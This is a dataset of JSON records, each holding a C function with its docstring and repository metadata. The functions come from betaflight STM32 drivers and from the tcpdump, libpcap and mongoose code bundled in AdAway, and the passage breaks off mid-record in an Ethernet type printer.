{"docstring": "/**\n  * @brief  Set RTC current date.\n  * @param  hrtc RTC handle\n  * @param  sDate Pointer to date structure\n  * @param  Format specifies the format of the entered parameters.\n  *          This parameter can be one of the following values:\n  *            @arg RTC_FORMAT_BIN: Binary data format\n  *            @arg RTC_FORMAT_BCD: BCD data format\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_RTC_SetDate(RTC_HandleTypeDef *hrtc, RTC_DateTypeDef *sDate, uint32_t Format)", "code": "{\n  uint32_t datetmpreg;\n  HAL_StatusTypeDef status;\n\n  /* Check the parameters */\n  assert_param(IS_RTC_FORMAT(Format));\n\n  /* Process Locked */\n  __HAL_LOCK(hrtc);\n\n  hrtc->State = HAL_RTC_STATE_BUSY;\n\n  if((Format == RTC_FORMAT_BIN) && ((sDate->Month & 0x10U) == 0x10U))\n  {\n    sDate->Month = (uint8_t)((sDate->Month & (uint8_t)~(0x10U)) + (uint8_t)0x0AU);\n  }\n\n  assert_param(IS_RTC_WEEKDAY(sDate->WeekDay));\n\n  if(Format == RTC_FORMAT_BIN)\n  {\n    assert_param(IS_RTC_YEAR(sDate->Year));\n    assert_param(IS_RTC_MONTH(sDate->Month));\n    assert_param(IS_RTC_DATE(sDate->Date));\n\n    datetmpreg = (((uint32_t)RTC_ByteToBcd2(sDate->Year)  << RTC_DR_YU_Pos) | \\\n                  ((uint32_t)RTC_ByteToBcd2(sDate->Month) << RTC_DR_MU_Pos) | \\\n                  ((uint32_t)RTC_ByteToBcd2(sDate->Date)  << RTC_DR_DU_Pos) | \\\n                  ((uint32_t)sDate->WeekDay               << RTC_DR_WDU_Pos));\n  }\n  else\n  {\n    assert_param(IS_RTC_YEAR(RTC_Bcd2ToByte(sDate->Year)));\n    assert_param(IS_RTC_MONTH(RTC_Bcd2ToByte(sDate->Month)));\n    assert_param(IS_RTC_DATE(RTC_Bcd2ToByte(sDate->Date)));\n\n    datetmpreg = ((((uint32_t)sDate->Year)    << RTC_DR_YU_Pos) | \\\n                  (((uint32_t)sDate->Month)   << RTC_DR_MU_Pos) | \\\n                  (((uint32_t)sDate->Date)    << RTC_DR_DU_Pos) | \\\n                  (((uint32_t)sDate->WeekDay) << RTC_DR_WDU_Pos));\n  }\n\n  /* Disable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_DISABLE(hrtc);\n\n\n  /* Enter Initialization mode */\n  status = RTC_EnterInitMode(hrtc);\n  if (status == HAL_OK)\n  {\n    /* Set the RTC_DR register */\n    hrtc->Instance->DR = (uint32_t)(datetmpreg & RTC_DR_RESERVED_MASK);\n\n\n    /* Exit Initialization mode */\n    status = RTC_ExitInitMode(hrtc);\n  }\n\n  /* Enable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_ENABLE(hrtc);\n\n  if (status == HAL_OK)\n  {\n    hrtc->State = HAL_RTC_STATE_READY;\n  }\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(hrtc);\n\n  return status;\n\n\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Handle Alarm interrupt request.\n  * @param  hrtc RTC handle\n  * @retval None\n  */\n", "func_signal": "void HAL_RTC_AlarmIRQHandler(RTC_HandleTypeDef *hrtc)", "code": "{\n  /* Clear the EXTI's line Flag for RTC Alarm */\n#if defined(DUAL_CORE)\n  if(HAL_GetCurrentCPUID() == CM7_CPUID)\n  {\n    __HAL_RTC_ALARM_EXTI_CLEAR_FLAG();\n  }\n  else\n  {\n    __HAL_RTC_ALARM_EXTID2_CLEAR_FLAG();\n  }\n#else  /* SINGLE_CORE */\n  __HAL_RTC_ALARM_EXTI_CLEAR_FLAG();\n#endif /* DUAL_CORE */\n\n#if defined(RTC_MISR_ALRAMF)\n  /* Get interrupt status */\n  uint32_t tmp = hrtc->Instance->MISR;\n\n  if((tmp & RTC_MISR_ALRAMF) != 0u)\n  {\n    /* Clear the AlarmA interrupt pending bit */\n    hrtc->Instance->SCR = RTC_SCR_CALRAF;\n\n#if (USE_HAL_RTC_REGISTER_CALLBACKS == 1)\n    /* Call Compare Match registered Callback */\n    hrtc->AlarmAEventCallback(hrtc);\n#else  /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n    HAL_RTC_AlarmAEventCallback(hrtc);\n#endif /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n  }\n#endif /* RTC_MISR_ALRAMF */\n\n#if defined(RTC_MISR_ALRBMF)\n  if((tmp & RTC_MISR_ALRBMF) != 0u)\n  {\n    /* Clear the AlarmB interrupt pending bit */\n    hrtc->Instance->SCR = RTC_SCR_CALRBF;\n\n#if (USE_HAL_RTC_REGISTER_CALLBACKS == 1)\n    /* Call Compare Match registered Callback */\n    hrtc->AlarmBEventCallback(hrtc);\n#else  /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n    HAL_RTCEx_AlarmBEventCallback(hrtc);\n#endif /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n  }\n#endif /* RTC_MISR_ALRBMF */\n\n#if defined(RTC_ISR_ALRAF)\n  /* Get the AlarmA interrupt source enable status */\n  if(__HAL_RTC_ALARM_GET_IT_SOURCE(hrtc, RTC_IT_ALRA) != 0U)\n  {\n    /* Get the pending status of the AlarmA Interrupt */\n    if(__HAL_RTC_ALARM_GET_FLAG(hrtc, RTC_FLAG_ALRAF) != 0U)\n    {\n      /* Clear the AlarmA interrupt pending bit */\n      __HAL_RTC_ALARM_CLEAR_FLAG(hrtc, RTC_FLAG_ALRAF);\n\n#if (USE_HAL_RTC_REGISTER_CALLBACKS == 1)\n      hrtc->AlarmAEventCallback(hrtc);\n#else  /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n      HAL_RTC_AlarmAEventCallback(hrtc);\n#endif /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n    }\n  }\n#endif /* RTC_ISR_ALRAF */\n\n#if defined(RTC_ISR_ALRBF)\n  /* Get the AlarmB interrupt source enable status */\n  if(__HAL_RTC_ALARM_GET_IT_SOURCE(hrtc, RTC_IT_ALRB) != 0U)\n  {\n    /* Get the pending status of the AlarmB Interrupt */\n    if(__HAL_RTC_ALARM_GET_FLAG(hrtc, RTC_FLAG_ALRBF) != 0U)\n    {\n      /* Clear the AlarmB interrupt pending bit */\n      __HAL_RTC_ALARM_CLEAR_FLAG(hrtc, RTC_FLAG_ALRBF);\n\n      /* AlarmB callback */\n#if (USE_HAL_RTC_REGISTER_CALLBACKS == 1)\n      hrtc->AlarmBEventCallback(hrtc);\n#else  /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n      HAL_RTCEx_AlarmBEventCallback(hrtc);\n#endif /* (USE_HAL_RTC_REGISTER_CALLBACKS == 1) */\n    }\n  }\n#endif /* RTC_ISR_ALRBF */\n\n  /* Change RTC state */\n  hrtc->State = HAL_RTC_STATE_READY;\n}", "path": "betaflight/lib/main/STM32H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_rtc.c", "commit_date": "2020-09-14 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Enables or disables the specified DAC channel.\n  * @param  DAC_Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_Channel_1: DAC Channel1 selected\n  *            @arg DAC_Channel_2: DAC Channel2 selected\n  * @param  NewState: new state of the DAC channel. \n  *          This parameter can be: ENABLE or DISABLE.\n  * @note   When the DAC channel is enabled the trigger source can no more be modified.\n  * @retval None\n  */\n", "func_signal": "void DAC_Cmd(uint32_t DAC_Channel, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(DAC_Channel));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected DAC channel */\n    DAC->CR |= (DAC_CR_EN1 << DAC_Channel);\n  }\n  else\n  {\n    /* Disable the selected DAC channel */\n    DAC->CR &= (~(DAC_CR_EN1 << DAC_Channel));\n  }\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/**\n  * @brief  Set the specified data holding register value for DAC channel1.\n  * @param  DAC_Align: Specifies the data alignment for DAC channel1.\n  *          This parameter can be one of the following values:\n  *            @arg DAC_Align_8b_R: 8bit right data alignment selected\n  *            @arg DAC_Align_12b_L: 12bit left data alignment selected\n  *            @arg DAC_Align_12b_R: 12bit right data alignment selected\n  * @param  Data: Data to be loaded in the selected data holding register.\n  * @retval None\n  */\n", "func_signal": "void DAC_SetChannel1Data(uint32_t DAC_Align, uint16_t Data)", "code": "{  \n  __IO uint32_t tmp = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_DAC_ALIGN(DAC_Align));\n  assert_param(IS_DAC_DATA(Data));\n  \n  tmp = (uint32_t)DAC_BASE; \n  tmp += DHR12R1_OFFSET + DAC_Align;\n\n  /* Set the DAC channel1 selected data holding register */\n  *(__IO uint32_t *) tmp = Data;\n}", "path": "betaflight/lib/main/STM32F4/Drivers/STM32F4xx_StdPeriph_Driver/src/stm32f4xx_dac.c", "commit_date": "2017-07-29 00:00:00", "repo_name": "betaflight/betaflight", "stars": 7745, "license": "gpl-3.0", "language": "c", "size": 393740}
{"docstring": "/* HAVE_FORK && HAVE_VFORK */\n", "func_signal": "static void\ninfo(register int verbose)", "code": "{\n\tstruct pcap_stat stat;\n\n\t/*\n\t * Older versions of libpcap didn't set ps_ifdrop on some\n\t * platforms; initialize it to 0 to handle that.\n\t */\n\tstat.ps_ifdrop = 0;\n\tif (pcap_stats(pd, &stat) < 0) {\n\t\t(void)fprintf(stderr, \"pcap_stats: %s\\n\", pcap_geterr(pd));\n\t\tinfoprint = 0;\n\t\treturn;\n\t}\n\n\tif (!verbose)\n\t\tfprintf(stderr, \"%s: \", program_name);\n\n\t(void)fprintf(stderr, \"%u packet%s captured\", packets_captured,\n\t    PLURAL_SUFFIX(packets_captured));\n\tif (!verbose)\n\t\tfputs(\", \", stderr);\n\telse\n\t\tputc('\\n', stderr);\n\t(void)fprintf(stderr, \"%u packet%s received by filter\", stat.ps_recv,\n\t    PLURAL_SUFFIX(stat.ps_recv));\n\tif (!verbose)\n\t\tfputs(\", \", stderr);\n\telse\n\t\tputc('\\n', stderr);\n\t(void)fprintf(stderr, \"%u packet%s dropped by kernel\", stat.ps_drop,\n\t    PLURAL_SUFFIX(stat.ps_drop));\n\tif (stat.ps_ifdrop != 0) {\n\t\tif (!verbose)\n\t\t\tfputs(\", \", stderr);\n\t\telse\n\t\t\tputc('\\n', stderr);\n\t\t(void)fprintf(stderr, \"%u packet%s dropped by interface\\n\",\n\t\t    stat.ps_ifdrop, PLURAL_SUFFIX(stat.ps_ifdrop));\n\t} else\n\t\tputc('\\n', stderr);\n\tinfoprint = 0;\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* pcap's list of available interfaces */\n", "func_signal": "int pcap_findalldevs_interfaces(pcap_if_t **alldevsp, char *errbuf)", "code": "{\n\n\t//printf(\"pcap_findalldevs()\\n\");\t\t\t\t// fulko\n\n\t*alldevsp = 0;\t\t\t\t\t\t\t\t\t\t\t\t/* initialize the returned variables before we do anything */\n\tstrcpy(errbuf, \"\");\n\tif (acn_parse_hosts_file(errbuf))\t\t\t\t\t\t\t/* scan the hosts file for potential IOPs */\n\t\t{\n\t\t//printf(\"pcap_findalldevs() returning BAD after parsehosts\\n\");\t\t\t\t// fulko\n\t\treturn -1;\n\t\t}\n\t//printf(\"pcap_findalldevs() got hostlist now finding devs\\n\");\t\t\t\t// fulko\n\tif (acn_findalldevs(errbuf))\t\t\t\t\t\t\t\t/* then ask the IOPs for their monitorable devices */\n\t\t{\n\t\t//printf(\"pcap_findalldevs() returning BAD after findalldevs\\n\");\t\t\t\t// fulko\n\t\treturn -1;\n\t\t}\n\t*alldevsp = acn_if_list;\n\tacn_if_list = 0;\t\t\t\t\t\t\t\t\t\t\t/* then forget our list head, because someone will call pcap_freealldevs() to empty the malloc'ed stuff */\n\t//printf(\"pcap_findalldevs() returning ZERO OK\\n\");\t\t\t\t// fulko\n\treturn 0;\n}", "path": "AdAway/tcpdump/jni/libpcap/fad-sita.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* BYTE_ORDER */\n", "func_signal": "static void mg_byte_reverse(unsigned char *buf, unsigned longs)", "code": "{\n/* Forrest: MD5 expect LITTLE_ENDIAN, swap if BIG_ENDIAN */\n#if BYTE_ORDER == BIG_ENDIAN\n  do {\n    uint32_t t = (uint32_t)((unsigned) buf[3] << 8 | buf[2]) << 16 |\n                 ((unsigned) buf[1] << 8 | buf[0]);\n    *(uint32_t *) buf = t;\n    buf += 4;\n  } while (--longs);\n#else\n  (void) buf;\n  (void) longs;\n#endif\n}", "path": "AdAway/webserver/jni/mongoose/mongoose.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* HAVE_FORK && HAVE_VFORK */\n", "func_signal": "static void\ndump_packet_and_trunc(u_char *user, const struct pcap_pkthdr *h, const u_char *sp)", "code": "{\n\tstruct dump_info *dump_info;\n\n\t++packets_captured;\n\n\t++infodelay;\n\n\tdump_info = (struct dump_info *)user;\n\n\t/*\n\t * XXX - this won't force the file to rotate on the specified time\n\t * boundary, but it will rotate on the first packet received after the\n\t * specified Gflag number of seconds. Note: if a Gflag time boundary\n\t * and a Cflag size boundary coincide, the time rotation will occur\n\t * first thereby cancelling the Cflag boundary (since the file should\n\t * be 0).\n\t */\n\tif (Gflag != 0) {\n\t\t/* Check if it is time to rotate */\n\t\ttime_t t;\n\n\t\t/* Get the current time */\n\t\tif ((t = time(NULL)) == (time_t)-1) {\n\t\t\terror(\"dump_and_trunc_packet: can't get current_time: %s\",\n\t\t\t    pcap_strerror(errno));\n\t\t}\n\n\n\t\t/* If the time is greater than the specified window, rotate */\n\t\tif (t - Gflag_time >= Gflag) {\n#ifdef HAVE_CAPSICUM\n\t\t\tFILE *fp;\n\t\t\tint fd;\n#endif\n\n\t\t\t/* Update the Gflag_time */\n\t\t\tGflag_time = t;\n\t\t\t/* Update Gflag_count */\n\t\t\tGflag_count++;\n\t\t\t/*\n\t\t\t * Close the current file and open a new one.\n\t\t\t */\n\t\t\tpcap_dump_close(dump_info->p);\n\n\t\t\t/*\n\t\t\t * Compress the file we just closed, if the user asked for it\n\t\t\t */\n\t\t\tif (zflag != NULL)\n\t\t\t\tcompress_savefile(dump_info->CurrentFileName);\n\n\t\t\t/*\n\t\t\t * Check to see if we've exceeded the Wflag (when\n\t\t\t * not using Cflag).\n\t\t\t */\n\t\t\tif (Cflag == 0 && Wflag > 0 && Gflag_count >= Wflag) {\n\t\t\t\t(void)fprintf(stderr, \"Maximum file limit reached: %d\\n\",\n\t\t\t\t    Wflag);\n\t\t\t\texit(0);\n\t\t\t\t/* NOTREACHED */\n\t\t\t}\n\t\t\tif (dump_info->CurrentFileName != NULL)\n\t\t\t\tfree(dump_info->CurrentFileName);\n\t\t\t/* Allocate space for max filename + \\0. */\n\t\t\tdump_info->CurrentFileName = (char *)malloc(PATH_MAX + 1);\n\t\t\tif (dump_info->CurrentFileName == NULL)\n\t\t\t\terror(\"dump_packet_and_trunc: malloc\");\n\t\t\t/*\n\t\t\t * Gflag was set otherwise we wouldn't be here. Reset the count\n\t\t\t * so multiple files would end with 1,2,3 in the filename.\n\t\t\t * The counting is handled with the -C flow after this.\n\t\t\t */\n\t\t\tCflag_count = 0;\n\n\t\t\t/*\n\t\t\t * This is always the first file in the Cflag\n\t\t\t * rotation: e.g. 0\n\t\t\t * We also don't need numbering if Cflag is not set.\n\t\t\t */\n\t\t\tif (Cflag != 0)\n\t\t\t\tMakeFilename(dump_info->CurrentFileName, dump_info->WFileName, 0,\n\t\t\t\t    WflagChars);\n\t\t\telse\n\t\t\t\tMakeFilename(dump_info->CurrentFileName, dump_info->WFileName, 0, 0);\n\n#ifdef HAVE_LIBCAP_NG\n\t\t\tcapng_update(CAPNG_ADD, CAPNG_EFFECTIVE, CAP_DAC_OVERRIDE);\n\t\t\tcapng_apply(CAPNG_SELECT_BOTH);\n#endif /* HAVE_LIBCAP_NG */\n#ifdef HAVE_CAPSICUM\n\t\t\tfd = openat(dump_info->dirfd,\n\t\t\t    dump_info->CurrentFileName,\n\t\t\t    O_CREAT | O_WRONLY | O_TRUNC, 0644);\n\t\t\tif (fd < 0) {\n\t\t\t\terror(\"unable to open file %s\",\n\t\t\t\t    dump_info->CurrentFileName);\n\t\t\t}\n\t\t\tfp = fdopen(fd, \"w\");\n\t\t\tif (fp == NULL) {\n\t\t\t\terror(\"unable to fdopen file %s\",\n\t\t\t\t    dump_info->CurrentFileName);\n\t\t\t}\n\t\t\tdump_info->p = pcap_dump_fopen(dump_info->pd, fp);\n#else\t/* !HAVE_CAPSICUM */\n\t\t\tdump_info->p = pcap_dump_open(dump_info->pd, dump_info->CurrentFileName);\n#endif\n#ifdef HAVE_LIBCAP_NG\n\t\t\tcapng_update(CAPNG_DROP, CAPNG_EFFECTIVE, CAP_DAC_OVERRIDE);\n\t\t\tcapng_apply(CAPNG_SELECT_BOTH);\n#endif /* HAVE_LIBCAP_NG */\n\t\t\tif (dump_info->p == NULL)\n\t\t\t\terror(\"%s\", pcap_geterr(pd));\n#ifdef HAVE_CAPSICUM\n\t\t\tset_dumper_capsicum_rights(dump_info->p);\n#endif\n\t\t}\n\t}\n\n\t/*\n\t * XXX - this won't prevent capture files from getting\n\t * larger than Cflag - the last packet written to the\n\t * file could put it over Cflag.\n\t */\n\tif (Cflag != 0) {\n\t\tlong size = pcap_dump_ftell(dump_info->p);\n\n\t\tif (size == -1)\n\t\t\terror(\"ftell fails on output file\");\n\t\tif (size > Cflag) {\n#ifdef HAVE_CAPSICUM\n\t\t\tFILE *fp;\n\t\t\tint fd;\n#endif\n\n\t\t\t/*\n\t\t\t * Close the current file and open a new one.\n\t\t\t */\n\t\t\tpcap_dump_close(dump_info->p);\n\n\t\t\t/*\n\t\t\t * Compress the file we just closed, if the user\n\t\t\t * asked for it.\n\t\t\t */\n\t\t\tif (zflag != NULL)\n\t\t\t\tcompress_savefile(dump_info->CurrentFileName);\n\n\t\t\tCflag_count++;\n\t\t\tif (Wflag > 0) {\n\t\t\t\tif (Cflag_count >= Wflag)\n\t\t\t\t\tCflag_count = 0;\n\t\t\t}\n\t\t\tif (dump_info->CurrentFileName != NULL)\n\t\t\t\tfree(dump_info->CurrentFileName);\n\t\t\tdump_info->CurrentFileName = (char *)malloc(PATH_MAX + 1);\n\t\t\tif (dump_info->CurrentFileName == NULL)\n\t\t\t\terror(\"dump_packet_and_trunc: malloc\");\n\t\t\tMakeFilename(dump_info->CurrentFileName, dump_info->WFileName, Cflag_count, WflagChars);\n#ifdef HAVE_LIBCAP_NG\n\t\t\tcapng_update(CAPNG_ADD, CAPNG_EFFECTIVE, CAP_DAC_OVERRIDE);\n\t\t\tcapng_apply(CAPNG_SELECT_BOTH);\n#endif /* HAVE_LIBCAP_NG */\n#ifdef HAVE_CAPSICUM\n\t\t\tfd = openat(dump_info->dirfd, dump_info->CurrentFileName,\n\t\t\t    O_CREAT | O_WRONLY | O_TRUNC, 0644);\n\t\t\tif (fd < 0) {\n\t\t\t\terror(\"unable to open file %s\",\n\t\t\t\t    dump_info->CurrentFileName);\n\t\t\t}\n\t\t\tfp = fdopen(fd, \"w\");\n\t\t\tif (fp == NULL) {\n\t\t\t\terror(\"unable to fdopen file %s\",\n\t\t\t\t    dump_info->CurrentFileName);\n\t\t\t}\n\t\t\tdump_info->p = pcap_dump_fopen(dump_info->pd, fp);\n#else\t/* !HAVE_CAPSICUM */\n\t\t\tdump_info->p = pcap_dump_open(dump_info->pd, dump_info->CurrentFileName);\n#endif\n#ifdef HAVE_LIBCAP_NG\n\t\t\tcapng_update(CAPNG_DROP, CAPNG_EFFECTIVE, CAP_DAC_OVERRIDE);\n\t\t\tcapng_apply(CAPNG_SELECT_BOTH);\n#endif /* HAVE_LIBCAP_NG */\n\t\t\tif (dump_info->p == NULL)\n\t\t\t\terror(\"%s\", pcap_geterr(pd));\n#ifdef HAVE_CAPSICUM\n\t\t\tset_dumper_capsicum_rights(dump_info->p);\n#endif\n\t\t}\n\t}\n\n\tpcap_dump((u_char *)dump_info->p, h, sp);\n#ifdef HAVE_PCAP_DUMP_FLUSH\n\tif (Uflag)\n\t\tpcap_dump_flush(dump_info->p);\n#endif\n\n\t--infodelay;\n\tif (infoprint)\n\t\tinfo(0);\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* Drop root privileges and chroot if necessary */\n", "func_signal": "static void\ndroproot(const char *username, const char *chroot_dir)", "code": "{\n\tstruct passwd *pw = NULL;\n\n\tif (chroot_dir && !username) {\n\t\tfprintf(stderr, \"tcpdump: Chroot without dropping root is insecure\\n\");\n\t\texit(1);\n\t}\n\n\tpw = getpwnam(username);\n\tif (pw) {\n\t\tif (chroot_dir) {\n\t\t\tif (chroot(chroot_dir) != 0 || chdir (\"/\") != 0) {\n\t\t\t\tfprintf(stderr, \"tcpdump: Couldn't chroot/chdir to '%.64s': %s\\n\",\n\t\t\t\t    chroot_dir, pcap_strerror(errno));\n\t\t\t\texit(1);\n\t\t\t}\n\t\t}\n#ifdef HAVE_LIBCAP_NG\n\t\tint ret = capng_change_id(pw->pw_uid, pw->pw_gid, CAPNG_NO_FLAG);\n\t\tif (ret < 0) {\n\t\t\tfprintf(stderr, \"error : ret %d\\n\", ret);\n\t\t}\n\t\telse {\n\t\t\tfprintf(stderr, \"dropped privs to %s\\n\", username);\n\t\t}\n#else\n\t\tif (initgroups(pw->pw_name, pw->pw_gid) != 0 ||\n\t\t    setgid(pw->pw_gid) != 0 || setuid(pw->pw_uid) != 0) {\n\t\t\tfprintf(stderr, \"tcpdump: Couldn't change to '%.32s' uid=%lu gid=%lu: %s\\n\",\n\t\t\t    username,\n\t\t\t    (unsigned long)pw->pw_uid,\n\t\t\t    (unsigned long)pw->pw_gid,\n\t\t\t    pcap_strerror(errno));\n\t\t\texit(1);\n\t\t}\n\t\telse {\n\t\t\tfprintf(stderr, \"dropped privs to %s\\n\", username);\n\t\t}\n#endif /* HAVE_LIBCAP_NG */\n\t}\n\telse {\n\t\tfprintf(stderr, \"tcpdump: Couldn't find user '%.32s'\\n\",\n\t\t    username);\n\t\texit(1);\n\t}\n#ifdef HAVE_LIBCAP_NG\n\t/* We don't need CAP_SETUID and CAP_SETGID any more. */\n\tcapng_updatev(\n\t\tCAPNG_DROP,\n\t\tCAPNG_EFFECTIVE | CAPNG_PERMITTED,\n\t\tCAP_SETUID,\n\t\tCAP_SETGID,\n\t\t-1);\n\tcapng_apply(CAPNG_SELECT_BOTH);\n#endif /* HAVE_LIBCAP_NG */\n\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* WIN32 */\n", "func_signal": "static int\ngetWflagChars(int x)", "code": "{\n\tint c = 0;\n\n\tx -= 1;\n\twhile (x > 0) {\n\t\tc += 1;\n\t\tx /= 10;\n\t}\n\n\treturn c;\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * Print an Ethernet frame.\n * This might be encapsulated within another frame; we might be passed\n * a pointer to a function that can print header information for that\n * frame's protocol, and an argument to pass to that function.\n */\n", "func_signal": "void\nether_print(netdissect_options *ndo,\n            const u_char *p, u_int length, u_int caplen,\n            void (*print_encap_header)(netdissect_options *ndo, const u_char *), const u_char *encap_header_arg)", "code": "{\n\tstruct ether_header *ep;\n\tu_int orig_length;\n\tu_short ether_type;\n\tu_short extracted_ether_type;\n\n\tif (caplen < ETHER_HDRLEN || length < ETHER_HDRLEN) {\n\t\tND_PRINT((ndo, \"[|ether]\"));\n\t\treturn;\n\t}\n\n\tif (ndo->ndo_eflag) {\n\t\tif (print_encap_header != NULL)\n\t\t\t(*print_encap_header)(ndo, encap_header_arg);\n\t\tether_hdr_print(ndo, p, length);\n\t}\n\torig_length = length;\n\n\tlength -= ETHER_HDRLEN;\n\tcaplen -= ETHER_HDRLEN;\n\tep = (struct ether_header *)p;\n\tp += ETHER_HDRLEN;\n\n\tether_type = EXTRACT_16BITS(&ep->ether_type);\n\nrecurse:\n\t/*\n\t * Is it (gag) an 802.3 encapsulation?\n\t */\n\tif (ether_type <= ETHERMTU) {\n\t\t/* Try to print the LLC-layer header & higher layers */\n\t\tif (llc_print(ndo, p, length, caplen, ESRC(ep), EDST(ep),\n\t\t    &extracted_ether_type) == 0) {\n\t\t\t/* ether_type not known, print raw packet */\n\t\t\tif (!ndo->ndo_eflag) {\n\t\t\t\tif (print_encap_header != NULL)\n\t\t\t\t\t(*print_encap_header)(ndo, encap_header_arg);\n\t\t\t\tether_hdr_print(ndo, (u_char *)ep, orig_length);\n\t\t\t}\n\n\t\t\tif (!ndo->ndo_suppress_default_print)\n\t\t\t\tND_DEFAULTPRINT(p, caplen);\n\t\t}\n\t} else if (ether_type == ETHERTYPE_8021Q  ||\n                ether_type == ETHERTYPE_8021Q9100 ||\n                ether_type == ETHERTYPE_8021Q9200 ||\n                ether_type == ETHERTYPE_8021QinQ) {\n\t\t/*\n\t\t * Print VLAN information, and then go back and process\n\t\t * the enclosed type field.\n\t\t */\n\t\tif (caplen < 4 || length < 4) {\n\t\t\tND_PRINT((ndo, \"[|vlan]\"));\n\t\t\treturn;\n\t\t}\n\t        if (ndo->ndo_eflag) {\n\t        \tuint16_t tag = EXTRACT_16BITS(p);\n\n\t\t\tND_PRINT((ndo, \"%s, \", ieee8021q_tci_string(tag)));\n\t\t}\n\n\t\tether_type = EXTRACT_16BITS(p + 2);\n\t\tif (ndo->ndo_eflag && ether_type > ETHERMTU)\n\t\t\tND_PRINT((ndo, \"ethertype %s, \", tok2str(ethertype_values,\"0x%04x\", ether_type)));\n\t\tp += 4;\n\t\tlength -= 4;\n\t\tcaplen -= 4;\n\t\tgoto recurse;\n\t} else if (ether_type == ETHERTYPE_JUMBO) {\n\t\t/*\n\t\t * Alteon jumbo frames.\n\t\t * See\n\t\t *\n\t\t *\thttp://tools.ietf.org/html/draft-ietf-isis-ext-eth-01\n\t\t *\n\t\t * which indicates that, following the type field,\n\t\t * there's an LLC header and payload.\n\t\t */\n\t\t/* Try to print the LLC-layer header & higher layers */\n\t\tif (llc_print(ndo, p, length, caplen, ESRC(ep), EDST(ep),\n\t\t    &extracted_ether_type) == 0) {\n\t\t\t/* ether_type not known, print raw packet */\n\t\t\tif (!ndo->ndo_eflag) {\n\t\t\t\tif (print_encap_header != NULL)\n\t\t\t\t\t(*print_encap_header)(ndo, encap_header_arg);\n\t\t\t\tether_hdr_print(ndo, (u_char *)ep, orig_length);\n\t\t\t}\n\n\t\t\tif (!ndo->ndo_suppress_default_print)\n\t\t\t\tND_DEFAULTPRINT(p, caplen);\n\t\t}\n\t} else {\n\t\tif (ethertype_print(ndo, ether_type, p, length, caplen) == 0) {\n\t\t\t/* ether_type not known, print raw packet */\n\t\t\tif (!ndo->ndo_eflag) {\n\t\t\t\tif (print_encap_header != NULL)\n\t\t\t\t\t(*print_encap_header)(ndo, encap_header_arg);\n\t\t\t\tether_hdr_print(ndo, (u_char *)ep, orig_length);\n\t\t\t}\n\n\t\t\tif (!ndo->ndo_suppress_default_print)\n\t\t\t\tND_DEFAULTPRINT(p, caplen);\n\t\t}\n\t}\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-ether.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * Prints the packet payload, given an Ethernet type code for the payload's\n * protocol.\n *\n * Returns non-zero if it can do so, zero if the ethertype is unknown.\n */\n", "func_signal": "int\nethertype_print(netdissect_options *ndo,\n                u_short ether_type, const u_char *p,\n                u_int length, u_int caplen)", "code": "{\n\tswitch (ether_type) {\n\n\tcase ETHERTYPE_IP:\n\t        ip_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_IPV6:\n\t\tip6_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_ARP:\n\tcase ETHERTYPE_REVARP:\n  \t        arp_print(ndo, p, length, caplen);\n\t\treturn (1);\n\n\tcase ETHERTYPE_DN:\n\t\tdecnet_print(ndo, p, length, caplen);\n\t\treturn (1);\n\n\tcase ETHERTYPE_ATALK:\n\t\tif 